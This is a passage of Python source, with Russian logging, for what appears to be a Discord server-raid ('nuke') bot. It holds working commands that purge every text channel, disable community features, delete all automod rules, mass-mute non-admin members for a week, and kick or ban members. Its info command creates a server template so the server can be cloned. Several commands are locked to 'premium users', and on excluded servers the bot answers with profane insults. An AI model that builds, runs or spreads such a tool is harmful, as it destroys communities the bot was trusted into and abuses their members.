        await ctx.send(f"The nickname for {success_count} participants has been successfully changed! The nickname for {failed_count} participants could not be changed.")
        console.print(f"[success]🎉 Команда massnick завершена: успешно изменено {success_count} никнеймов, не удалось {failed_count}[/]")

    except discord.Forbidden:
        await ctx.send("I do not have permission to change the nicknames of members on this server.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды massnick на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred when executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды massnick на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def purge(ctx):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда purge не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда purge запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Эта команда запрещена на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда purge запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=discord.Colour.from_rgb(255, 0, 0))
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Пользователь {ctx.author.name} ({ctx.author.id}) не в premium_users, доступ к purge запрещён[/]")
        return

    if not ctx.guild.me.guild_permissions.manage_messages:
        await ctx.send("Jeg har ikke tilladelse til at slette beskeder på denne server.")
        console.print(f"[error]❌ Недостаточно прав для команды purge на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🧹 Запуск команды purge для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    success_count = 0
    failed_count = 0

    async def clear_text_channel(channel):
        nonlocal success_count, failed_count
        try:
            async with limiter:
                await channel.purge(limit=None)
                success_count += 1
                console.print(f"[success]✅ Все сообщения удалены из текстового канала {channel.name} (ID: {channel.id})[/]")
        except discord.Forbidden:
            failed_count += 1
            console.print(f"[error]❌ Нет прав для очистки сообщений в текстовом канале {channel.name} (ID: {channel.id})[/]")
        except discord.HTTPException as e:
            failed_count += 1
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
                console.print(f"[warning]⏳ Rate limit при очистке канала {channel.name}, ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
                try:
                    async with limiter:
                        await channel.purge(limit=None)
                        success_count += 1
                        console.print(f"[success]✅ Все сообщения удалены из текстового канала {channel.name} (ID: {channel.id}) после повторной попытки[/]")
                except Exception:
                    console.print(f"[error]❌ Повторная попытка очистки канала {channel.name} (ID: {channel.id}) не удалась[/]")
            else:
                console.print(f"[error]❌ Ошибка HTTP при очистке текстового канала {channel.name} (ID: {channel.id}): {e}[/]")
        except Exception as e:
            failed_count += 1
            console.print(f"[error]❌ Неизвестная ошибка при очистке текстового канала {channel.name} (ID: {channel.id}): {e}[/]")

    tasks = [clear_text_channel(channel) for channel in ctx.guild.text_channels]

    await asyncio.gather(*tasks, return_exceptions=True)

    if success_count == 0:
        await ctx.send("I don't have enough permissions to clear messages in all channels.")
        console.print(f"[error]❌ Недостаточно прав у бота для очистки сообщений во всех каналах на сервере {guild.name} ({guild.id})[/]")
    else:
        await ctx.send(f"Successfully deleted messages from {success_count} channels! Failed to clear {failed_count} channels.")
        console.print(f"[success]🎉 Команда purge завершена: успешно очищено {success_count} каналов, не удалось очистить {failed_count}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def disable_community(ctx):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда disable_community не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда disable_community запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Комньюнити офнешь в своём свинарнике.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда disable_community запрещена[/]")
        return

    if not ctx.guild.me.guild_permissions.manage_guild:
        await ctx.send(f"You do not have sufficient permissions to disable community features!")
        console.print(f"[error]❌ Недостаточно прав для команды disable_community на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🔧 Запуск команды disable_community для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        async with limiter:
            await guild.edit(community=False)
            await ctx.send(f"Community features have been successfully disabled on the server!")
            console.print(f"[success]✅ Функции сообщества успешно отключены на сервере {guild.name} ({guild.id})[/]")
    except discord.Forbidden:
        await ctx.send(f"You do not have enough permissions to disable community features on the server!")
        console.print(f"[error]❌ Нет прав для отключения функций сообщества на сервере {guild.name} ({guild.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
            console.print(f"[warning]⏳ Rate limit при отключении функций сообщества, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
            try:
                async with limiter:
                    await guild.edit(community=False)
                    await ctx.send(f"The community features have been successfully disabled on the server after a second attempt!")
                    console.print(f"[success]✅ Функции сообщества успешно отключены на сервере {guild.name} ({guild.id}) после повторной попытки[/]")
            except Exception:
                await ctx.send(f"Failed to disable community features on the server after trying again!")
                console.print(f"[error]❌ Повторная попытка отключения функций сообщества на сервере {guild.name} ({guild.id}) не удалась[/]")
        else:
            await ctx.send(f"Couldn't disable community functions on the server!")
            console.print(f"[error]❌ Ошибка HTTP при отключении функций сообщества на сервере {guild.name} ({guild.id}): {e}[/]")
    except Exception as e:
        await ctx.send(f"I couldn't disable the community features on the server!")
        console.print(f"[error]❌ Неизвестная ошибка при отключении функций сообщества на сервере {guild.name} ({guild.id}): {e}[/]")
        
@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def disable_automod(ctx):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда disable_automod не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда disable_automod запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Трахни себя автомодом.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда disable_automod запрещена[/]")
        return

    if not ctx.guild.me.guild_permissions.manage_guild:
        await ctx.send("The bot does not have enough permissions to delete all auto-moderation rules.")
        console.print(f"[error]❌ Недостаточно прав для команды disable_automod на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🧹 Запуск команды disable_automod для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        automod_rules = await guild.fetch_automod_rules()
        if not automod_rules:
            await ctx.send("There are no auto-moderation rules on the server.")
            console.print(f"[info]🔍 На сервере {guild.name} ({guild.id}) отсутствуют правила автомодерации[/]")
            return

        headers = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
        success_count = 0
        failed_count = 0

        async def delete_rule(rule):
            nonlocal success_count, failed_count
            url = f"https://discord.com/api/v10/guilds/{guild.id}/auto-moderation/rules/{rule.id}"
            try:
                async with limiter:
                    async with aiohttp.ClientSession() as session:
                        async with session.delete(url, headers=headers) as response:
                            if response.status == 204:
                                success_count += 1
                                console.print(f"[success]✅ Правило автомодерации '{rule.name}' удалено[/]")
                            else:
                                failed_count += 1
                                console.print(f"[error]❌ Не удалось удалить правило '{rule.name}': HTTP {response.status}[/]")
            except Exception as e:
                failed_count += 1
                console.print(f"[error]❌ Ошибка при удалении правила '{rule.name}': {e}[/]")

        tasks = [delete_rule(rule) for rule in automod_rules]
        await asyncio.gather(*tasks, return_exceptions=True)

        if success_count == 0 and failed_count > 0:
            await ctx.send("Failed to delete auto-moderation rules due to errors or insufficient permissions.")
            console.print(f"[error]❌ Не удалось удалить ни одного правила автомодерации на сервере {guild.name} ({guild.id})[/]")
        else:
            await ctx.send(f"All auto-moderation rules have been successfully removed! Removed: {success_count}, failed: {failed_count}.")
            console.print(f"[success]🎉 Команда disable_automod завершена: удалено {success_count} правил, не удалось {failed_count}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have enough permissions to delete auto-moderation rules.")
        console.print(f"[error]❌ Недостаточно прав для удаления правил автомодерации на сервере {guild.name} ({guild.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
            console.print(f"[warning]⏳ Rate limit при удалении правил автомодерации, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
            try:
                automod_rules = await guild.fetch_automod_rules()
                tasks = [delete_rule(rule) for rule in automod_rules]
                await asyncio.gather(*tasks, return_exceptions=True)
                await ctx.send(f"All auto-moderation rules were successfully removed after a second attempt! Removed: {success_count}, failed: {failed_count}.")
                console.print(f"[success]🎉 Команда disable_automod завершена после повторной попытки: удалено {success_count} правил, не удалось {failed_count}[/]")
            except Exception:
                await ctx.send("I was unable to delete the auto-moderation rules after trying again.")
                console.print(f"[error]❌ Повторная попытка удаления правил автомодерации на сервере {guild.name} ({guild.id}) не удалась[/]")
        else:
            await ctx.send(f"Error when deleting auto-moderation rules!")
            console.print(f"[error]❌ Ошибка HTTP при удалении правил автомодерации на сервере {guild.name} ({guild.id}): {e}[/]")
    except Exception as e:
        await ctx.send(f"The bot does not have enough permissions to delete auto-moderation rules.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды disable_automod на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def massmute(ctx):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда massmute не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда massmute запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Мутить у себя дома будешь.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда massmute запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: Эта команда доступна только для пользователей premium.", color=discord.Colour.from_rgb(255, 0, 0))
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Пользователь {ctx.author.name} ({ctx.author.id}) не в premium_users, доступ к massmute запрещён[/]")
        return

    if not ctx.guild.me.guild_permissions.moderate_members:
        await ctx.send("The bot does not have enough permissions to mute participants.")
        console.print(f"[error]❌ Недостаточно прав для команды massmute на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🔇 Запуск команды massmute для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        success_count = 0
        failed_count = 0
        mute_duration = 7 * 24 * 60 * 60  

        async def mute_member(member):
            nonlocal success_count, failed_count
            try:
                async with limiter:
                    await member.edit(timed_out_until=discord.utils.utcnow() + datetime.timedelta(seconds=mute_duration))
                    success_count += 1
                    console.print(f"[success]✅ Участник {member.name} ({member.id}) замьючен на 7 дней[/]")
            except discord.Forbidden:
                failed_count += 1
                console.print(f"[error]❌ Нет прав для мьюта участника {member.name} ({member.id})[/]")
            except discord.HTTPException as e:
                failed_count += 1
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
                    console.print(f"[warning]⏳ Rate limit при мьюте {member.name}, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
                    try:
                        async with limiter:
                            await member.edit(timed_out_until=discord.utils.utcnow() + datetime.timedelta(seconds=mute_duration))
                            success_count += 1
                            console.print(f"[success]✅ Участник {member.name} ({member.id}) замьючен после повторной попытки[/]")
                    except Exception:
                        console.print(f"[error]❌ Повторная попытка мьюта для {member.name} ({member.id}) не удалась[/]")
                else:
                    console.print(f"[error]❌ Ошибка HTTP при мьюте участника {member.name} ({member.id}): {e}[/]")
            except Exception as e:
                failed_count += 1
                console.print(f"[error]❌ Неизвестная ошибка при мьюте участника {member.name} ({member.id}): {e}[/]")

        tasks = [mute_member(member) for member in guild.members if not member.bot and not member.guild_permissions.administrator]
        await asyncio.gather(*tasks, return_exceptions=True)

        await ctx.send(f"{success_count} people muted! Failed to mute {failed_count} people.")
        console.print(f"[success]🎉 Команда massmute завершена: замьючено {success_count} человек, не удалось {failed_count}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have enough permissions to mute participants.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды massmute на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send(f"An error occurred while executing the massmute command!")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды massmute на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def massunmute(ctx):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда massunmute не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда massunmute запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Размьючивать у себя дома будешь.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда massunmute запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: Эта команда доступна только для пользователей premium.", color=discord.Colour.from_rgb(255, 0, 0))
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Пользователь {ctx.author.name} ({ctx.author.id}) не в premium_users, доступ к massunmute запрещён[/]")
        return

    if not ctx.guild.me.guild_permissions.moderate_members:
        await ctx.send("The bot does not have enough permissions to mute participants.")
        console.print(f"[error]❌ Недостаточно прав для команды massunmute на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🔊 Запуск команды massunmute для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        success_count = 0
        failed_count = 0

        async def unmute_member(member):
            nonlocal success_count, failed_count
            try:
                async with limiter:
                    await member.edit(timed_out_until=None)
                    success_count += 1
                    console.print(f"[success]✅ Участник {member.name} ({member.id}) размьючен[/]")
            except discord.Forbidden:
                failed_count += 1
                console.print(f"[error]❌ Нет прав для размьюта участника {member.name} ({member.id})[/]")
            except discord.HTTPException as e:
                failed_count += 1
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
                    console.print(f"[warning]⏳ Rate limit при размьюте {member.name}, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
                    try:
                        async with limiter:
                            await member.edit(timed_out_until=None)
                            success_count += 1
                            console.print(f"[success]✅ Участник {member.name} ({member.id}) размьючен после повторной попытки[/]")
                    except Exception:
                        console.print(f"[error]❌ Повторная попытка размьюта для {member.name} ({member.id}) не удалась[/]")
                else:
                    console.print(f"[error]❌ Ошибка HTTP при размьюте участника {member.name} ({member.id}): {e}[/]")
            except Exception as e:
                failed_count += 1
                console.print(f"[error]❌ Неизвестная ошибка при размьюте участника {member.name} ({member.id}): {e}[/]")

        tasks = [unmute_member(member) for member in guild.members if not member.bot and not member.guild_permissions.administrator and member.timed_out_until]
        if not tasks:
            await ctx.send("В мьюте никого нет.")
            console.print(f"[info]🔍 На сервере {guild.name} ({guild.id}) нет замьюченных участников[/]")
            return

        await asyncio.gather(*tasks, return_exceptions=True)

        await ctx.send(f"{success_count} people have been unsubscribed! {failed_count} people have failed to unsubscribe.")
        console.print(f"[success]🎉 Команда massunmute завершена: размьючено {success_count} человек, не удалось {failed_count}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have enough permissions to mute participants.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды massunmute на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send(f"An error occurred while executing the massunmute command!")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды massunmute на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
async def mute(ctx, member: discord.Member = None, member_id: int = None):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда mute не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда mute запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Замуть весь сервер фуррией, еблан.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда mute запрещена[/]")
        return

    if not ctx.guild.me.guild_permissions.moderate_members:
        await ctx.send("The bot does not have enough permissions to mute participants.")
        console.print(f"[error]❌ Недостаточно прав для команды mute на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🔇 Запуск команды mute для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        if not member and not member_id:
            await ctx.send("You must specify the participant or its ID.")
            console.print(f"[error]❌ Не указан участник или ID для команды mute[/]")
            return

        target = member or guild.get_member(member_id)
        if not target:
            await ctx.send(f"There is no such participant on the server.")
            console.print(f"[error]❌ Участник с ID {member_id} не найден на сервере {guild.name} ({guild.id})[/]")
            return

        mute_duration = 7 * 24 * 60 * 60 
        async with limiter:
            await target.edit(timed_out_until=discord.utils.utcnow() + datetime.timedelta(seconds=mute_duration))
            await ctx.send(f"Participant {target.mention} was muted for one week.")
            console.print(f"[success]✅ Участник {target.name} ({target.id}) замьючен на 7 дней[/]")

    except discord.Forbidden:
        await ctx.send(f"The bot does not have enough permissions to mute a participant.")
        console.print(f"[error]❌ Нет прав для мьюта участника {target.name if target else member_id} ({member_id if not target else target.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
            console.print(f"[warning]⏳ Rate limit при мьюте {target.name if target else member_id}, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
            try:
                async with limiter:
                    await target.edit(timed_out_until=discord.utils.utcnow() + datetime.timedelta(seconds=mute_duration))
                    await ctx.send(f"Participant {target.mention} was muted for one week after a second attempt.")
                    console.print(f"[success]✅ Участник {target.name} ({target.id}) замьючен после повторной попытки[/]")
            except Exception:
                await ctx.send(f"The participant could not be muted after a second attempt.")
                console.print(f"[error]❌ Повторная попытка мьюта для {target.name if target else member_id} ({member_id if not target else target.id}) не удалась[/]")
        else:
            await ctx.send(f"Couldn't load the participant!")
            console.print(f"[error]❌ Ошибка HTTP при мьюте участника {target.name if target else member_id} ({member_id if not target else target.id}): {e}[/]")
    except Exception as e:
        await ctx.send(f"Couldn't load the participant!")
        console.print(f"[error]❌ Неизвестная ошибка при мьюте участника {target.name if target else member_id} ({member_id if not target else target.id}): {e}[/]")

@bot.command()
async def kick(ctx, member: discord.Member = None, member_id: int = None):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда kick не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда kick запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Кикни свою мамашу из дома.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда kick запрещена[/]")
        return

    if not ctx.guild.me.guild_permissions.kick_members:
        await ctx.send("The bot does not have enough permissions to kick participants.")
        console.print(f"[error]❌ Недостаточно прав для команды kick на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🚪 Запуск команды kick для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        if not member and not member_id:
            await ctx.send("You must specify the participant or its ID.")
            console.print(f"[error]❌ Не указан участник или ID для команды kick[/]")
            return

        target = member or guild.get_member(member_id)
        if not target:
            await ctx.send(f"There is no such participant on the server.")
            console.print(f"[error]❌ Участник с ID {member_id} не найден на сервере {guild.name} ({guild.id})[/]")
            return

        async with limiter:
            await target.kick(reason="переезд-нахуй")
            await ctx.send(f"Participant {target.mention} has been kicked.")
            console.print(f"[success]✅ Участник {target.name} ({target.id}) кикнут[/]")

    except discord.Forbidden:
        await ctx.send(f"The bot does not have enough permissions to kick a participant.")
        console.print(f"[error]❌ Нет прав для кика участника {target.name if target else member_id} ({member_id if not target else target.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
            console.print(f"[warning]⏳ Rate limit при кике {target.name if target else member_id}, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
            try:
                async with limiter:
                    await target.kick(reason="переезд-нахуй")
                    await ctx.send(f"Participant {target.mention} was kicked after a second attempt.")
                    console.print(f"[success]✅ Участник {target.name} ({target.id}) кикнут после повторной попытки[/]")
            except Exception:
                await ctx.send(f"I was unable to kick the participant after a second attempt.")
                console.print(f"[error]❌ Повторная попытка кика для {target.name if target else member_id} ({member_id if not target else target.id}) не удалась[/]")
        else:
            await ctx.send(f"Couldn't kick the participant!")
            console.print(f"[error]❌ Ошибка HTTP при кике участника {target.name if target else member_id} ({member_id if not target else target.id}): {e}[/]")
    except Exception as e:
        await ctx.send(f"Не удалось кикнуть участника {target.name if target else member_id}: {e}")
        console.print(f"[error]❌ Неизвестная ошибка при кике участника {target.name if target else member_id} ({member_id if not target else target.id}): {e}[/]")

@bot.command()
async def ban(ctx, member: discord.Member = None, member_id: int = None):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда ban не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда ban запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Забань стим, еблан.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда ban запрещена[/]")
        return

    if not ctx.guild.me.guild_permissions.ban_members:
        await ctx.send("Недостаточно разрешений у бота для бана участников.")
        console.print(f"[error]❌ Недостаточно прав для команды ban на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🔨 Запуск команды ban для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        if not member and not member_id:
            await ctx.send("You must specify the participant or its ID.")
            console.print(f"[error]❌ Не указан участник или ID для команды ban[/]")
            return

        target = member or guild.get_member(member_id)
        if not target:
            await ctx.send(f"There is no such participant on the server.")
            console.print(f"[error]❌ Участник с ID {member_id} не найден на сервере {guild.name} ({guild.id})[/]")
            return

        async with limiter:
            await guild.ban(target, reason="переезд-нахуй")
            await ctx.send(f"The user {target.mention} has been banned.")
            console.print(f"[success]✅ Участник {target.name} ({target.id}) забанен[/]")

    except discord.Forbidden:
        await ctx.send(f"The bot does not have enough permissions to ban a participant.")
        console.print(f"[error]❌ Нет прав для бана участника {target.name if target else member_id} ({member_id if not target else target.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
            console.print(f"[warning]⏳ Rate limit при бане {target.name if target else member_id}, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
            try:
                async with limiter:
                    await guild.ban(target, reason="переезд-нахуй")
                    await ctx.send(f"Participant {target.mention} was banned after a second attempt.")
                    console.print(f"[success]✅ Участник {target.name} ({target.id}) забанен после повторной попытки[/]")
            except Exception:
                await ctx.send(f"Failed to ban user, after trying again.")
                console.print(f"[error]❌ Повторная попытка бана для {target.name if target else member_id} ({member_id if not target else target.id}) не удалась[/]")
        else:
            await ctx.send(f"Failed to ban user!")
            console.print(f"[error]❌ Ошибка HTTP при бане участника {target.name if target else member_id} ({member_id if not target else target.id}): {e}[/]")
    except Exception as e:
        await ctx.send(f"Failed to ban user!")
        console.print(f"[error]❌ Неизвестная ошибка при бане участника {target.name if target else member_id} ({member_id if not target else target.id}): {e}[/]")

@bot.command(name='delete_webhook')
@commands.cooldown(1, 120, commands.BucketType.user)
async def delete_webhook_command(ctx, webhook_url: str):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда delete_webhook не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда delete_webhook запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Выеби сначала весь свой сервер.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда delete_webhook запрещена[/]")
        return

    if not ctx.guild.me.guild_permissions.manage_webhooks:
        await ctx.send("The bot does not have sufficient rights to delete webhooks.")
        console.print(f"[error]❌ Недостаточно прав для команды delete_webhook на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]🗑️ Запуск команды delete_webhook для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        async with aiohttp.ClientSession() as session:
            async with limiter:
                async with session.delete(webhook_url, headers={'Authorization': f'Bot {BOT_TOKEN}'}) as response:
                    if response.status == 204:
                        await ctx.send("Webhook successfully removed!")
                        console.print(f"[success]✅ Вебхук успешно удалён: {webhook_url}[/]")
                    elif response.status == 404:
                        await ctx.send("Webhook not found.")
                        console.print(f"[error]❌ Вебхук не найден: {webhook_url}[/]")
                    else:
                        await ctx.send(f"Failed to delete webhook!")
                        console.print(f"[error]❌ Не удалось удалить вебхук {webhook_url}: HTTP {response.status}[/]")
    except aiohttp.ClientError as e:
        await ctx.send(f"An error occurred while deleting the webhook: {e}")
        console.print(f"[error]❌ Ошибка при удалении вебхука {webhook_url}: {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def info(ctx):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда info не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда info запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Много хочешь.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда info запрещена[/]")
        return

    if not ctx.guild.me.guild_permissions.manage_guild:
        console.print(f"[warning]⚠️ Бот не имеет прав manage_guild, шаблон сервера не будет создан на сервере {guild.name} ({guild.id})[/]")

    console.print(f"[action]ℹ️ Запуск команды info для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        embed = discord.Embed(
            title=f"Server information {guild.name}",
            description=(
                f"`ID:` {guild.id}\n"
                f"`Mebers:` {len(guild.members)}\n"
                f"`Roles:` {len(guild.roles)}\n"
                f"`Channels:` {len(guild.channels)}\n"
                f"`Emoji:` {len(guild.emojis)}\n"
                f"`Creator:` {guild.owner.mention if guild.owner else 'Неизвестно'}\n"
                f"`Date of creation:` {guild.created_at.strftime('%Y-%m-%d %H:%M:%S')}"
            ),
            color=discord.Colour.from_rgb(0, 0, 0)
        )

        if guild.icon is not None:
            embed.set_image(url=guild.icon.url)

        template_url = None
        if ctx.guild.me.guild_permissions.manage_guild:
            try:
                async with limiter:
                    templates = await guild.templates()
                    for template in templates:
                        await template.delete()
                        console.print(f"[success]✅ Шаблон {template.name} удалён[/]")
                
                async with limiter:
                    template = await guild.create_template(name=f"Шаблон сервера {guild.name}")
                    template_url = f"https://discord.new/{template.code}"
                    embed.description += f"\n`Template:` {template_url}"
                    console.print(f"[success]✅ Создан новый шаблон: {template_url}[/]")
            except discord.Forbidden:
                console.print(f"[error]❌ Нет прав для управления шаблонами на сервере {guild.name} ({guild.id})[/]")
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
                    console.print(f"[warning]⏳ Rate limit при работе с шаблонами, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
                    try:
                        async with limiter:
                            template = await guild.create_template(name=f"Шаблон сервера {guild.name}")
                            template_url = f"https://discord.new/{template.code}"
                            embed.description += f"\n`Template:` {template_url}"
                            console.print(f"[success]✅ Создан новый шаблон после повторной попытки: {template_url}[/]")
                    except Exception:
                        console.print(f"[error]❌ Повторная попытка создания шаблона на сервере {guild.name} ({guild.id}) не удалась[/]")
                else:
                    console.print(f"[error]❌ Ошибка HTTP при работе с шаблонами на сервере {guild.name} ({guild.id}): {e}[/]")

        await ctx.author.send(embed=embed)
        console.print(f"[success]🎉 Команда info завершена: информация отправлена пользователю {ctx.author.name} ({ctx.author.id})[/]")

    except discord.Forbidden:
        embed = discord.Embed(
            title=f"Server information {guild.name}",
            description=(
                f"`ID:` {guild.id}\n"
                f"`Members:` {len(guild.members)}\n"
                f"`Roles:` {len(guild.roles)}\n"
                f"`Channels:` {len(guild.channels)}\n"
                f"`Emoji:` {len(guild.emojis)}\n"
                f"`Creator:` {guild.owner.mention if guild.owner else 'Неизвестно'}\n"
                f"`Date of creation:` {guild.created_at.strftime('%Y-%m-%d %H:%M:%S')}"
            ),
            color=discord.Colour.from_rgb(0, 0, 0)
        )

        if guild.icon is not None:
            embed.set_image(url=guild.icon.url)

        await ctx.author.send(embed=embed)
        console.print(f"[error]❌ Нет прав для отправки полной информации, отправлена базовая информация пользователю {ctx.author.name} ({ctx.author.id})[/]")

    except Exception as e:
        await ctx.send(f"An error occurred while executing the info command: {e}")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды info на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
